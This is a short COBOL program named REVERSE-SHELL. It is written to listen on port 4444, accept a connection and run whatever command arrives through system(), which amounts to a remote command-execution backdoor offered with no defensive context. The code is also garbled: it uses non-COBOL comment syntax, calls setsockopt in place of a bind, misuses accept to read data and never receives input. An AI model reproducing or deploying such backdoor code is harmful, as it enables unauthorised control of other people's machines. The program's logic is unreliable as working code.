IDENTIFICATION DIVISION.
PROGRAM-ID. REVERSE-SHELL.

ENVIRONMENT DIVISION.
INPUT-OUTPUT SECTION.
FILE-CONTROL.

DATA DIVISION.
FILE SECTION.

WORKING-STORAGE SECTION.
01 socket PIC S9(9) COMP.
01 address PIC X(4).
88 address-len VALUE 4.
01 port PIC S9(4) COMP.
01 protocol PIC 9 COMP.
01 backlog PIC S9(4) COMP.
01 buffer PIC X(1024).
01 command PIC X(1024).
01 execution-status PIC S9(9) COMP.

PROCEDURE DIVISION.

-- Create the socket.
create-socket:
    DISPLAY "Creating socket..."
    CALL "socket" USING BY VALUE socket, BY VALUE protocol, RETURNING execution-status
    IF execution-status < 0
        DISPLAY "ERROR: UNABLE TO CREATE SOCKET."
        STOP RUN
    END-IF.

-- Set up the socket address structure.
set-socket-address:
    move "0.0.0.0" TO address
    move 4444 TO port
    move 2 TO protocol
    DISPLAY "Binding socket..."
    CALL "setsockopt" USING BY VALUE socket, 1, 2, BY VALUE address, address-len, RETURNING execution-status
    IF execution-status < 0
        DISPLAY "ERROR: UNABLE TO BIND SOCKET."
        STOP RUN
    END-IF.

-- Listen for connections.
listen-for-connections:
    DISPLAY "Listening on port 4444..."
    CALL "listen" USING BY VALUE socket, backlog, RETURNING execution-status
    IF execution-status < 0
        DISPLAY "ERROR: UNABLE TO LISTEN ON SOCKET."
        STOP RUN
    END-IF.

-- Wait for a connection.
accept-connection:
    DISPLAY "Waiting for connection..."
    CALL "accept" USING BY VALUE socket, BY reference buffer, BY VALUE 1024, RETURNING execution-status
    IF execution-status < 0
        DISPLAY "ERROR: UNABLE TO ACCEPT CONNECTION."
        STOP RUN
    END-IF.
    DISPLAY "Connection received."

-- Execute the command.
execute-command:
    move buffer TO command
    DISPLAY "Executing command: " command
    CALL "system" USING BY VALUE command, RETURNING execution-status
    IF execution-status < 0
        DISPLAY "ERROR: UNABLE TO EXECUTE COMMAND."
        STOP RUN
    END-IF.

-- Close the socket.
close-socket:
    DISPLAY "Closing socket..."
    CALL "close" USING BY VALUE socket, RETURNING execution-status
    IF execution-status < 0
        DISPLAY "ERROR: UNABLE TO CLOSE SOCKET."
        STOP RUN
    END-IF.

-- Main program.
main-program:
    perform create-socket
    perform set-socket-address
    perform listen-for-connections
    perform accept-connection
    perform execute-command
    perform close-socket
    STOP RUN.
